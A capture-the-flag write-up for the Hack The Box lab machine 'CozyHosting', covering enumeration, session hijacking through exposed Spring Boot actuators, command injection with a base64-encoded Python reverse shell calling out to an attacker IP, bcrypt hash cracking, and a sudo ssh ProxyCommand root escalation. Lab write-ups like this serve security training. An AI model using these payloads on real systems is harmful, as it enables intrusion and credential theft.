![CozyHosting](https://github.com/amalcew/htb-writeups/assets/73908014/044c77c9-970e-45ed-99fc-bb3624135a92)

## Reconnaissance & port scanning

Engagement was started with port scanning using `nmap`

```bash
# Nmap 7.94SVN scan initiated Thu Feb 22 02:10:51 2024 as: nmap -v -sV -sC --open -vvv -oA initial 10.10.11.230
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up, received syn-ack (0.047s latency).
Scanned at 2024-02-22 02:10:51 CET for 91s
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp   open  http            syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
1111/tcp open  lmsocialserver? syn-ack
1234/tcp open  hotline?        syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 22 02:12:22 2024 -- 1 IP address (1 host up) scanned in 91.99 seconds
```

Scan revealed four open ports: 22, 80, 1111, 1234. Let's examine the webpage - provided IP address redirects to **cozyhosting.htb**, which needs to be added to `/etc/hosts/`

```bash
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

![01-initial_page](https://github.com/amalcew/htb-writeups/assets/73908014/5cdb06ac-da1f-4253-8150-569efda143c2)

First interesting thin on the website is login page.

![02-login_page](https://github.com/amalcew/htb-writeups/assets/73908014/1a27f6df-59ee-4d61-97ef-48d6d37a50ef)

Manually entering the default credentials didn't return any progress. Let's fuzz the website using `ffuf` 

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://cozyhosting.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-small.txt [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 56ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 57ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 83ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 84ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 84ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
# on at least 3 different hosts [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 84ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
# Copyright 2007 James Fisher [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 85ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 83ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 82ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 80ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 57ms]
admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 77ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 70ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 50ms]
:: Progress: [87664/87664] :: Job [1/1] :: 304 req/sec :: Duration: [0:03:42] :: Errors: 0 ::
```

The scan returned some additional directories, such as `admin` or `error`. Examining the `error` page gives some clue about the backend provider for the website

![03-error_page](https://github.com/amalcew/htb-writeups/assets/73908014/bf069e3a-1bd8-4943-bc7a-c52a70249a6b)

So-called **whitelabel error page** is default error page for **Spring Boot**. This is solid find for additional enumeration of potential directories.

[SecLists](https://github.com/danielmiessler/SecLists) have additional wordlist for analyzing Spring engine which can be used with `ffuf`

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FUZZ -u http://cozyhosting.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 63ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 66ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 68ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 77ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 122ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 58ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 69ms]
actuator/sessions       [Status: 200, Size: 148, Words: 1, Lines: 1, Duration: 51ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 68ms]
:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Looks like this website has misconfigured endpoints called `actuators`. Those endpoints provide useful information during website development and debugging and should be disabled on production server.

## Initial foothold

The most interesting resource is `actuator/sessions`, which stores something that looks like session IDs

![image](https://github.com/amalcew/htb-writeups/assets/73908014/4b72e22f-b235-4938-8bbc-1a5a910b3b2c)

First thing I tried was using this value on earlier discovered login page as cookie ID

![image](https://github.com/amalcew/htb-writeups/assets/73908014/43e7cd2c-98b7-4a3a-889c-9f684a74bd3f)

Which ended with successful authorization to the panel.

![06-admin_page](https://github.com/amalcew/htb-writeups/assets/73908014/188f2de6-6496-4292-977b-c00657b92626)

The page is mainly static, the only working component is `connection settings` prompt. 

The prompt returns suspicious output when hostname and username is submitted.

![07-miconfigured_ssh](https://github.com/amalcew/htb-writeups/assets/73908014/b4d5bd24-e848-4fa6-ac22-c6da53a01fa1)

The output looks like a typical error information given by `ssh` client on any Linux distro. This means, that the `ssh` is directly exposed and _could be_ exploitable.

To be sure, we can try to trigger a help section providing only a hostname.

![image](https://github.com/amalcew/htb-writeups/assets/73908014/0df979d7-85d3-4fbb-bf4b-ec543674f3a6)

and try to execute bash command

![08-rce](https://github.com/amalcew/htb-writeups/assets/73908014/abc8b955-f2de-4823-84a4-1c7990b4f61c)

The prompt is 100% vulnerable to remote code execution. To leverage this, we need to create a payload that will spadn reverse shell to attacking machine. After some experiments with different shell, Python 3 was chosen:

```bash
> cat reverse_shell.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

> cat reverse_shell.sh | base64 -w 0
cHl0aG9u ... SNIP ... KTsnCg==
```

Example payload was created:

```bash
user;echo${IFS}cHl0aG9u ... SNIP ... KTsnCg==|base64${IFS}-d|/bin/bash;
```

where `${IFS}` is special shell variable that can be used instead of whitespace rejected by the prompt. The payload is ready to be executed.

We need to create a `netcat` process listening on selected port...

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
```

and submit the payload...

![image](https://github.com/amalcew/htb-writeups/assets/73908014/4bee690a-28cd-4c1b-8c80-b1057109958d)

which spawns the bash reverse shell:

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.230] 36204
bash: cannot set terminal process group (991): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$ 
```

## Escalating privileges and obtaining user flag

Right after obtaining the shell we can find `.jar` file of some application. `wget`-ing the file and opening it with 
`jd-gui` reveals PostgreSQL credentials:

![09-jar_properties](https://github.com/amalcew/htb-writeups/assets/73908014/3e64b51c-6ba1-41cf-95ea-26975cfec2e0)

Using the credentials, we can sign into the database stored on the machine:

```bash
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres -d cozyhosting
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=# \pset pager off
Pager usage is off.
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$1***************************************************8zim | User
 admin     | $2a$1***************************************************O8dm | Admin
(2 rows)

```

Let's try crack those hashes using `john`. Attempt of cracking `kanderson`'s password was unsuccessful, but admin's password was easy to crack.

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ma************ed (?)   
1g 0:00:00:45 DONE (2024-02-22 19:24) 0.02182g/s 61.28p/s 61.28c/s 61.28C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

using the password on the webpage resulted in error 403, but some more snooping in the `/home` directory gave different user named `josh`. Connecting to this user was successful.

```bash
> ssh josh@10.10.11.230
josh@10.10.11.230's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 29 09:03:32 AM UTC 2023

  System load:           0.39794921875
  Usage of /:            53.9% of 5.42GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             264
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.88
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f0de


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from xx.xx.xx.xx
josh@cozyhosting:~$ cat user.txt 
6a24************************a8f3
```

## Root privileges escalation and final flag

After achieving access to standard user, it is time to escalate to root. The process is a failry simple, as we discover potential hole in user's `sudo` privileges:

```bash
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Knowing about the presense of open ssh access on the website makes more sense now - apperantly this access is also rootles, which means we can abuse with little effort. Searching [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#shell) we can find a ssh payload which should spawn a shell. As we can see below, it worked as a charm.

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/home/josh# cd /root
root@cozyhosting:~# cat root.txt 
b7****************************6b
```
